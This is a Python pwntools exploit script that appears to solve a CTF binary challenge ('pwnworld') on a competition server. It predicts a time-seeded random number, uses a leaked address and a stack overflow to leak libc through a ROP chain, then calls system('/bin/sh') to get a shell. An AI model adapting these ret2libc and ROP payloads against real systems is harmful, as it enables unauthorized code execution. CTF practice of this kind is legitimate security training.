#!/usr/bin/python
import time
from ctypes import CDLL
from math import floor

from pwn import *

CONN = "nc ctf-gemastik.ub.ac.id 10012".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)   
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
c
b *game
b *game+22
""".format(
    **locals()
)

# Binary filename
exe = "./pwnworld"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.37.so", checksec=False)
libc_dll = CDLL("libc.so.6")
# ldd_dll = CDLL("ld-2.37.so")

def get_random():
  libc_dll.srand(libc_dll.time(0))
  return str(libc_dll.rand() % 417).encode()

# Start program
io = start()

# Send the payload
payload = get_random()
sla(b"? ", payload)

ru(b": ")
leak = int(rl().decode().strip(), 16)

info("Gift: " + hex(leak))

elf.address = leak - 0x404c
info("Base: " + hex(elf.address))

offset = 280
payload = flat({
  offset: [
    elf.sym["helper"] + 8,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.main
  ]
})

sla(b"feedback?", payload)

rl()
puts = int(u64(rl().strip().ljust(8, b"\x00")))

info("puts: " + hex(puts))

libc.address = puts - libc.sym["puts"]

binsh = libc.search(b"/bin/sh\x00").__next__()

info("binsh " + hex(binsh))

payload = get_random()
sla(b"? ", payload)

offset = 280
payload = flat({
  offset: [
    elf.sym["helper"] + 8,
    p64(binsh),
    elf.sym["helper"] + 9,
    libc.sym["system"],
  ]
})


sla(b"feedback?", payload)



# Got Shell?
io.interactive()